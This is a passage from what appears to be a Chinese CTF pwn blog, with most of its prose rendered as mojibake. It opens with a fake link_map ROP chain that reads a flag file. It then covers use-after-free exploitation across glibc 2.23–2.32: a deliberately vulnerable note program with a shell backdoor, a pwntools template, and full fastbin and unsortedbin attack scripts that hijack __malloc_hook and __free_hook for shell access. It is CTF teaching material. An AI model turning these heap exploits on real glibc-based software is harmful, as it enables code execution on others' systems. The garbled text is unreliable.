p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5a0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+53) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(fake_rsp) + p64(ret)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(0x0) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºldåŠ¨æ€è¿æ¥åŠ è½½çš„äº‹æƒ…ï¼Œæ‰€ä»¥å°±ç®—æ˜¯åŒä¸€ä¸ªç‰ˆæœ¬ä¸­çš„link_mapç›¸å¯¹äºlibcåŸºåœ°å€åœ¨ä¸åŒæœºå™¨ä¸­ä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œéœ€è¦çˆ†ç ´ç¬¬4ï¼Œ5ä¸¤ä½ï¼Œä¸€ä¸ªå­—èŠ‚ã€‚\n\nâ–²é¢˜å¤–è¯ï¼šé€‚ç”¨åˆ°ldåŠ¨æ€é“¾æ¥åº“çš„è¯ï¼Œå¦‚æœç›´æ¥patchelfçš„è¯ï¼Œå¾ˆå¯èƒ½å‡ºé”™çš„ï¼ŒåŸå› æœªçŸ¥ã€‚æ¨èè¿˜æ˜¯ç”¨docker:\n\n[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\n## 2.è§¦å‘æ¡ä»¶\n\n(1)è°ƒç”¨exit()\n(2)èƒ½å¤Ÿä»mainå‡½æ•°è¿”å›\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nbanæ‰äº†å¾ˆå¤šä¸œè¥¿çš„æ—¶å€™ã€‚ä½†æ˜¯è¿™ä¸ªéœ€è¦æ³„éœ²åœ°å€æ‰è¡Œçš„ï¼Œå¦å¤–ç”±äºå¯èƒ½éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¦‚æœè¿˜æ¶‰åŠå…¶ä»–çš„çˆ†ç ´å°±å¾—æ…é‡è€ƒè™‘ä¸€ä¸‹äº†ï¼Œåˆ«åˆ°æ—¶å€™çˆ†å¾—é»„èŠ±èœéƒ½å‡‰äº†ã€‚\n","tags":["Heap"],"categories":["PWN","pwnå †-Skill"]},{"title":"å„ç‰ˆæœ¬UAFä¸“åœº","url":"/2021/08/19/å„ç‰ˆæœ¬UAFä¸“åœº/","content":"\n# å‰è¨€\n\nä¸€èˆ¬æ¥è¯´UAFéƒ½æ˜¯æ¯”è¾ƒå¥½åˆ©ç”¨çš„ï¼Œå°¤å…¶æ˜¯åœ¨æœ‰tcacheçš„ç‰ˆæœ¬ä¸‹ï¼Œ2.32ä¹‹å‰ï¼Œæ²¡æœ‰å¯¹fdåšä»»ä½•æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰å¯¹sizeåšä»»ä½•æ£€æŸ¥ï¼Œé‚£ä¹ˆç›´æ¥æ”¹fdå°±èƒ½æƒ³ç”³è¯·å“ªå„¿å°±ç”³è¯·å“ªå„¿ã€‚ä½†æ˜¯è¿™é‡Œå°±é¢ä¸´åœ°å€çš„é—®é¢˜ï¼Œæ‰€ä»¥é«˜ç‰ˆæœ¬ä¸‹çš„UAFå¸¸å¸¸ä¸ä¼šç»™ä½ Showå‡½æ•°ï¼Œé€šå¸¸ç»“åˆFSOPæ¥çˆ†ç ´æ³„éœ²åœ°å€ã€‚è€Œä½ç‰ˆæœ¬çš„ï¼Œæ²¡æœ‰tcacheçš„æ—¶å€™ï¼Œä¸ç»™showå‡½æ•°ä¼šæ›´åŠ å›°éš¾ï¼Œå› ä¸ºfastbin attackä¼šæ£€æŸ¥sizeä½ï¼Œé€šå¸¸è¿˜éœ€è¦ä¼ªé€ ã€‚\n\nè¿™é‡Œå°±2.23~2.32ç‰ˆæœ¬çš„UAFåšä¸ªæ€»ç»“åˆ©ç”¨ï¼Œå„ä¸ªæ¡ä»¶çš„ç¼©å‡ã€‚\n\n# ä¸€ã€é¢˜ç›®åŠè°ƒè¯•è„šæœ¬\n\nâ–²é¦–å…ˆç»™å‡ºè‡ªå·±ä¸ºäº†æ–¹ä¾¿è°ƒè¯•å†™çš„é¢˜å’Œå¯¹åº”çš„expï¼Œå­˜åœ¨UAFï¼Œå †æº¢å‡ºï¼Œåé—¨ï¼Œmallocå’Œcallocåˆ‡æ¢ç­‰å¤šä¸ªæ¼æ´ï¼Œä½†æ˜¯å»é™¤äº†Double freeå‚è€ƒnoteé¢˜ç›®ï¼š\n\n```c\n//gcc -ggdb note.c -o note\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar* notelist[1000];\nint* freelist[1000];\n\nint count = 0;\n\n\nvoid backdoor() {\n   puts(\"You hacked me!!\");\n   system(\"/bin/sh\");\n}\n\nvoid malloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)malloc(size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid calloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)calloc(0x1,size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid del_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx] && (freelist[idx] != idx))\n    {\n        free(notelist[idx]);\n        freelist[idx] = idx;\n        puts(\"Success!\");\n        return;\n    }\n    else\n    {\n        puts(\"Can not double free!\");\n        return;\n        \n\n    }\n\n}\n\nvoid print_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx])\n    {\n        puts(notelist[idx]);\n        return;\n    }\n}\n\nvoid edit_note()\n{\n    char buf[8];\n    int idx;\n    int size;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    printf(\"Size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    if (notelist[idx])\n    {\n        printf(\"Content :\");\n        read(0, notelist[idx], size);\n        puts(\"Success!\");\n        return;\n    }\n}\n\n\nvoid menu() {\n    puts(\"----------------------\");\n    puts(\"       MY  NOTE       \");\n    puts(\"----------------------\");\n    puts(\" 1. Malloc Add note   \");\n    puts(\" 2. Delete note       \");\n    puts(\" 3. Print note        \");\n    puts(\" 4. Edit note         \");\n    puts(\" 5. Calloc Add note   \");\n    puts(\" 6. Exit              \");\n    puts(\"--------Author:PIG-007\");\n    printf(\"Your choice :\");\n};\n\nint main() {\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    freelist[0] = 1001;\n    char* heap_leak = (char*)(malloc(0x438));\n    printf(\"Gift_Heap:%p\\n\",heap_leak);\n\n    char* libc_leak = (char*)&printf;\n    printf(\"Gift_Libc:%p\\n\",libc_leak);\n    \n    char* elf_leak = (char*)&main;\n    printf(\"Gift_elf:%p\\n\",elf_leak);\n    \n    free(heap_leak);\n    heap_leak = NULL;\n    libc_leak = NULL;\n    elf_leak = NULL;\n    char buf[4];\n    while (1) {\n        menu();\n        read(0, buf, 4);\n        switch(atoi(buf))\n        {\n            case 1:\n                malloc_add_note();\n                break;\n            case 2:\n                del_note();\n                break;\n            case 3:\n                print_note();\n                break;\n            case 4:\n                edit_note();\n                break;\n            case 5:\n                calloc_add_note();\n                break;\n            case 6:\n                exit(0);\n                break;\n            default:\n                puts(\"Invalid choice!\");\n                break;\n        }\n    }\n    return 0;\n\n}\n```\n\n å¯¹åº”expè®¾ç½®ï¼š\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\n#from LibcSearcher import *\nimport commands\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\ncontext.timeout = 0.5\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\nelf = ELF(binary)\nlargeBinIdx = 1096\nunsortedBinIdx = 88\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add_malloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'1')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef free(idx):\n\tp.sendlineafter(\"Your choice :\",'2')\n\tp.sendlineafter('Index :',str(idx))\n\ndef show(idx):\n\tp.sendlineafter(\"Your choice :\",'3')\n\tp.sendlineafter('Index :',str(idx))\n    \ndef edit(idx,size,content):\n\tp.sendlineafter(\"Your choice :\",'4')\n\tp.sendlineafter('Index :',str(idx))\n\tp.sendlineafter('Size :',str(size))\n\tp.sendafter('Content :',content)    \n    \ndef add_calloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'5')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef exit():\n\tp.sendlineafter(\"Your choice :\",'6')\n\ndef edit_m(idx,size,content):\n\tsleep(0.01)\n\tp.sendline('4')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef free_m(idx):\n\tsleep(0.01)\n\tp.sendline('2')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\ndef add_malloc_m(size,content):\n\tsleep(0.01)\n\tp.sendline('1')\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef tcacheDelete(idx):\n\tfor i in range(7):\n\t\tfree(i+idx)\n        \ndef tcacheMalloc(size):\n\tfor i in range(7):\n\t\tadd_malloc(size,'\\x00')\n\ndef leak_heap():\n\tglobal largeBinIdx\n\tglobal unsortedBinIdx\n\tru(\"Gift_Heap:0x\")\n\tLeakHeap = int(rc(12),16)\n\tlog.info(\"LeakHeap:0x%x\"%LeakHeap)\n\tpath = libc.path\n\t#version = [\"2.23\",\"2.27\",\"2.29\",\"2.31\",\"2.32\",\"2.33\"]\n\tif(\"2.23\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.24\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.25\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.26\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.27\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.28\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.29\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.30\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.31\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.32\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.33\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telse:\n\t\tprint(\"Version Wrong!\")\n\t\tquit()\n\treturn heap_base\n\ndef leak_elf():\n\tru(\"Gift_elf:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakElf:0x%x\"%Leak)\n\treturn Leak\n\ndef leak_libc():\n\tru(\"Gift_Libc:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakLibc:0x%x\"%Leak)\n\treturn Leak\n\ndef getMain_arena(libc_base):\n\treturn libc_base+libc.sym['__malloc_hook']+0x10\n\ndef getOnegadget():\n    originStr=commands.getstatusoutput('one_gadget ' + context.binary.libc.path)[1]\n    print originStr\n    one_gadget = []\n    lstKey = [] \n    lengthKey = 0\n    key = 'execve'\n    countStr = originStr.count(key)\n    if countStr < 1:\n        print('No one_gadget')\n    elif countStr == 1: #only one one_gadget\n        indexKey = originStr.find(key)\n        one_gadget.append(int(originStr[indexKey-8:indexKey-1],16))\n        return one_gadget\n    else: #multiple one_gadgey\n        indexKey = originStr.find(key)\n        lstKey.append(indexKey) \n        while countStr > 1:\n            str_new = originStr[indexKey+1:len(originStr)+1]\n            indexKey_new = str_new.find(key)\n            indexKey = indexKey+1 +indexKey_new\n            lstKey.append(indexKey)\n            countStr -= 1\n        for i in range(len(lstKey)):\n            one_gadget.append(int(originStr[(lstKey[i]-8):lstKey[i]-1],16))\n        return one_gadget\n\n    \ndef pwn():\n    heap_base = leak_heap()\n    libc_base = leak_libc() - libc.sym['printf']\n    elf_base = leak_elf() - elf.sym['main']\n    log.info(\"heap_base:0x%x\"%heap_base)\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"elf_base:0x%x\"%elf_base)\n    add_malloc(0x1000-0x290-0x8,'PIG007NB')\n\n    \n    \ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n\n\n# äºŒã€ç¯å¢ƒæ­å»º\n\n## å‰è¨€\n\nä¼—æ‰€å‘¨çŸ¥ï¼Œpwnçš„Glibcç¯å¢ƒå‘æ¥æ˜¯ä¸€ä¸ªéš¾è§£é¢˜ï¼Œå¾ˆå¤šå¤§ä½¬åœ¨ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„Glibcéƒ½å¾ˆå¤´ç–¼ï¼Œä¸€ä¸ªä¸æ³¨æ„å°±å®¹æ˜“å‡ºé”™ã€‚åƒGithubä¸Šçš„`glibc-all-in-one`æ­é…`patchelf`\n\n`glibc-all-in-one`:[matrix1001/glibc-all-in-one: ğŸA convenient glibc binary and debug file downloader and source code auto builder (github.com)](https://github.com/matrix1001/glibc-all-in-one)\n\n`patchelf`:[NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)](https://github.com/NixOS/patchelf)\n\nå¯¹äºå¾ˆå¤šäººæ¥è¯´æä¸ªè™šæ‹Ÿæœºç¼–è¯‘ç¯å¢ƒä¸€ä¸ªåŒ…æ²¡è£…å¥½å°±å®¹æ˜“æŒ‚æ‰ï¼Œç„¶åå°±GGï¼Œè¿™å®åœ¨æ˜¯å¾ˆæµªè´¹ç”Ÿå‘½çš„ä¸€ä»¶äº‹æƒ…ã€‚è€Œ`patchelf`å…¶å®æœ‰æ—¶å€™ä¹Ÿä¸å¤ªé¡¶ç”¨ï¼Œè¿˜æœ‰`Docker`é‡Œçš„\n\n`pwnDocker`:[skysider/pwndocker - Docker Image | Docker Hub](https://hub.docker.com/r/skysider/pwndocker)\n\nå…¶å®æœ‰æ—¶å€™ä¹Ÿæ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œè€Œä¸”éœ€è¦ä¾é ä½œè€…æ›´æ–°ï¼Œè‡ªå·±ç¼–è¯‘ä¹Ÿå®¹æ˜“å‡ºé”™ã€‚ä½†æ˜¯è¿™å€’æ˜¯æ¿€å‘äº†æˆ‘ä¸€ä¸ªæƒ³æ³•ï¼Œä¸ºæ¯ä¸ªLibcç‰ˆæœ¬æ­å»ºä¸ªdockerå®¹å™¨ï¼Œç„¶åé€šè¿‡æ˜ å°„å…³ç³»å°†é¢˜ç›®æ˜ å°„è¿›å®¹å™¨ä¸­ï¼Œç›¸å½“äºåªéœ€è¦å®¹å™¨ä¸­çš„libcç¯å¢ƒï¼Œè¿™æ ·å°±ä¸éœ€è¦è€ƒè™‘è¿™äº›ä¸œè¥¿äº†ã€‚\n\n## é¡¹ç›®\n\nç»è¿‡å¤§é‡æµ‹è¯•ï¼Œè‡ªå·±å†™äº†ä¸€ä¸ªå°é¡¹ç›®ï¼Œé€‚åˆæ‰€æœ‰Libcç‰ˆæœ¬ï¼Œåªè¦docker hubä¸­æœ‰å¯¹åº”libcç‰ˆæœ¬çš„ubuntuå®¹å™¨ï¼Œè¯¥å®¹å™¨å¯¹åº”çš„aptæºè¿˜æœ‰åœ¨æ›´æ–°ï¼Œå°±èƒ½ç”¨ï¼Œè·Ÿè‡ªå·±æœ¬èº«ç¯å¢ƒæ²¡å•¥å…³ç³»ã€‚å®æµ‹æ‰€æœ‰ç‰ˆæœ¬éƒ½è¡Œï¼Œä¸€é”®æ­å»ºï¼Œä¸€é”®ä½¿ç”¨ï¼š\n\nGithub:[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\nGitee:[PIG-007/pwnDockerAll (gitee.com)](https://gitee.com/Piggy007/pwnDockerAll)\n\nè¯¦æƒ…çœ‹é¡¹ç›®é‡Œã€‚\n\n\n\n# ä¸‰ã€Glibc2.23\n\n## 1.UAF + Leak + Sizeä¸åšé™åˆ¶ï¼š\n\nè¿™ç§æƒ…å†µç›´æ¥freeè¿›unsortedbinæ³„éœ²åœ°å€ï¼Œç„¶åæ‰“fastbin attackï¼Œå€ŸåŠ©0x7få­—èŠ‚é”™ä½åŠ«æŒmalloc_hookå³å¯ï¼Œæ²¡å•¥æŠ€æœ¯å«é‡ã€‚è¿™é‡Œå†è¯´ä¸€äº›ï¼Œå…¶å®0x56ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¯ä»¥å€ŸåŠ©unsortedbin attackå°†å †åœ°å€å†™åˆ°ä¸€ä¸ªåœ°æ–¹ç„¶åå­—èŠ‚é”™ä½ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7fï¼š0111 1**11**1\n\n0x56ï¼š0101 0**11**0\n\nä¸»è¦çœ‹çš„æ˜¯AMä½ï¼ŒåŠ ç²—çš„ä¸¤ä½ï¼Œä¸èƒ½åˆšå¥½æ˜¯10ï¼Œæ£€æµ‹ï¼š\n\n(1)æ˜¯å¦å±äºå½“å‰çº¿ç¨‹çš„main_arena\n\n(2)æ˜¯å¦æ˜¯mmapå‡ºæ¥çš„chunkçš„æ£€æµ‹\n\næ‰€ä»¥æŒ‰ç…§é“ç†æ¥è®²ï¼Œå°¾æ•°ä¸º4 5 c då››ä¸ªç³»åˆ—ä¸èƒ½é€šè¿‡æ£€æµ‹ï¼Œå…¶ä»–éƒ½å¯ä»¥çš„ã€‚è€Œå¯¹äºå †åœ°å€çš„éšæœºæ€§ï¼Œ0x56å’Œ0x55éƒ½æ˜¯å¯èƒ½çš„ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¸€å®šæˆåŠŸï¼ŒåŒæ ·éœ€è¦çˆ†ç ´ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºè¦†å†™äº†_IO_wide_dataéƒ¨åˆ†æ•°æ®ï¼Œæœ‰äº›æ•°æ®å¯èƒ½æ‰“å°ä¸å‡ºæ¥ï¼Œç›´æ¥ä¸€è‚¡è„‘å‘é€ä¿¡æ¯ç”³è¯·å †å—å³å¯ã€‚è‡³äºone_gadgetæ²¡åŠæ³•ç”¨çš„ï¼Œå‚ç…§realloc_hookè°ƒæ•´æ ˆå¸§ã€‚\n\n## 2.UAF + Leak + sizeé™åˆ¶\n\nâ–²æ¯”å¦‚è¯´sizeé™åˆ¶ä¸èƒ½ç”³è¯·0x70å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•å­—èŠ‚é”™ä½ç”³è¯·malloc_hookçš„åœ°æ–¹ã€‚ä¸€èˆ¬æ¥è¯´æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š\n\n(1)åªèƒ½æ˜¯å°Chunkï¼Œå³0x20~0x80ï¼š\n\næ³„éœ²heapåœ°å€ï¼Œä¿®æ”¹FDï¼ŒæŒ‡å‘ä¸Šä¸€ä¸ªchunkæ¥ä¿®æ”¹sizeï¼Œé‡Šæ”¾è¿›å…¥unsortedbinåæ³„éœ²å¾—åˆ°libcåœ°å€ï¼Œä¹‹åå†å€Ÿç”¨0x7fçš„UAFå­—èŠ‚é”™ä½ç”³è¯·å³å¯åˆ°malloc_hookå³å¯ã€‚\n\n(2)åªèƒ½æ˜¯ä¸­ç­‰çš„chunkï¼Œå¤§äºfatsbinå°äºlargebinçš„ï¼Œå³0x90~0x3f0ã€‚\n\næ³„éœ²åœ°å€åï¼Œç›´æ¥ç”¨unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼Œç„¶ååˆ©ç”¨fastbinYé“¾åœ¨main_areanä¸Šç•™ä¸‹sizeï¼Œç”³è¯·è¿‡å»ä¿®æ”¹top_chunkä¸ºmalloc_hook-0x10æˆ–è€…malloc_hook-0x28ï¼Œä¿®å¤unsortedbinä¹‹åå³å¯ä»»æ„ä¿®æ”¹ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[1])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\nè¿™é‡Œå°±åˆ©ç”¨reallocè°ƒæ•´äº†ä¸€ä¸‹æ ˆå¸§\n\n(3)åªèƒ½æ˜¯å¤§chunkï¼Œå³0x400~...\n\næ³„éœ²åœ°å€åï¼Œç›´æ¥ç”¨unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶å¯åœ¨free_hooké™„è¿‘ä¼ªé€ å †sizeï¼Œç„¶åç”³è¯·è¿‡å»ä¿®æ”¹free_hookä¸ºsystemï¼Œé‡Šæ”¾å †å—å³å¯ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)åªèƒ½æ˜¯æŸä¸ªç‰¹å®šå¤§å°çš„chunkï¼Œæ¯”å¦‚åªèƒ½æ˜¯0x40ï¼Œ0x60ï¼Œä¸€èˆ¬ä¸ä¼šåªèƒ½æ˜¯ä¸€ä¸ªå¤§å°çš„ï¼Œä¸ç„¶åŸºæœ¬æ— æ³•åˆ©ç”¨ã€‚\n\næ³„éœ²åœ°å€heapåœ°å€åï¼Œä¿®æ”¹sizeä½è¿›å…¥unsortedbinä¸­ï¼Œå†æ³„éœ²libcåœ°å€ã€‚ç”±äºæ— æ³•0x56å’Œ0x7få­—èŠ‚é”™ä½åˆ©ç”¨ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨ä¸€ä¸ªsizeçš„binï¼Œé‡Šæ”¾ä¹‹ååœ¨fastbinYä¸­ç•™ä¸‹sizeï¼Œç„¶åå¦ä¸€ä¸ªsizeç”³è¯·è¿‡å»ï¼Œä¿®æ”¹top_chunkåˆ°malloc_hookå¤„å³å¯ï¼Œä¹‹åç±»ä¼¼ã€‚\n\nè¯¦æƒ…å‚ç…§CISCNä¸œåŒ—èµ›åŒºå¤ç°ä¸­çš„é¢˜ç›®small_chunkã€‚\n\n## 3.UAF 